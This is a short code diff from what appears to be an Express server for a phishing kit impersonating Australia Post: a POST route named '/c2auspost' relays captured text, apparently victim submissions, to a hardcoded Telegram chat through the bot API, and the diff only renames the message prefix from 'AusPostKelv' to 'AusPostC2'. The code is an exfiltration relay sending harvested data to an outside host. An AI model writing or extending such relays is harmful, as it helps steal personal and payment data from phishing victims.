@@ -423,7 +423,7 @@ app.post("/c2auspost", (req, res) => {
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
               chat_id: 680379375,
-              text: `AusPostKelv:\n${originalText}`,
+              text: `AusPostC2:\n${originalText}`,
               parse_mode: "Markdown",
             }
           )
